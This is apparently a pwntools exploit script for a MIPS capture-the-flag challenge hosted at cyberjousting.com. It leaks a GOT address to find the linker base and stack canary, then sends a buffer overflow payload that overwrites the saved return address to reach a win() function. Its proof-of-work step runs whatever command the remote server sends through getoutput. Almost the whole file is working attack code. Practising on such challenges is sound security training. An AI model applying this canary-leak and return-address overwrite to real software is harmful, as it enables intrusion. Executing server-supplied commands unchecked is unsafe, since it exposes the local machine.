from pwn import *
from subprocess import getoutput


build = 'mipsel32r5-glibc'
binary = "./ctf/mips"
elf = context.binary = ELF(binary, checksec=False)
docker = ELF('/usr/bin/docker',checksec=False)

gs = """
set architecture mips:isa32r5
break main
b *0x400c88
continue
"""

if args.REMOTE:
    p = remote("mips.chal.cyberjousting.com", 1357)

    ### SOLVE POW ###
    p.recvline()
    cmd = p.recvline().decode().strip()
    print(f"Solving POW: {cmd}")
    answer = getoutput(cmd)
    p.sendline(answer.encode())
elif args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "70%"]
    p = docker.process(['run','-i','--rm','-v','./ctf:/target/ctf','-p','1234:1234',f'legoclones/mips-pwn:{build}','chroot','/target','/qemu','-g','1234','/ctf/mips'])
    print("Remote debugging started...")
    gdb.attach(("127.0.0.1",1234), gdbscript=gs, exe=binary)
else:
    p = docker.process(['run','-i','--rm','-v','./ctf:/target/ctf',f'legoclones/mips-pwn:{build}','chroot','/target','/qemu','/ctf/mips'])



### GET CANARY ###
canary_got_addr = 0x420060
canary_ld_offset = 0x3fef4

p.recvuntil(b'> ')
p.sendline(b'1')
p.sendline(hex(canary_got_addr).encode())

canary_addr = int(p.recvline().strip().split(b' ')[-1],16)
print(f"Canary GOT: {hex(canary_got_addr)}")
ld_base = canary_addr - canary_ld_offset
print(f"Linker base: {hex(ld_base)}")

p.recvuntil(b'> ')
p.sendline(b'1')
p.sendline(hex(canary_addr).encode())
canary = int(p.recvline().strip().split(b' ')[-1],16)
print(f"Canary: {hex(canary)}")




### EXPLOIT OVERFLOW ###
p.recvuntil(b'> ')
p.sendline(b'2')

payload = flat(
    b'A'*0x10,                              # padding
    p32(canary),                            # canary
    p32(0),                                 # s8
    p32(0x400964),                          # ra (win())
)
p.sendline(payload)


p.interactive()
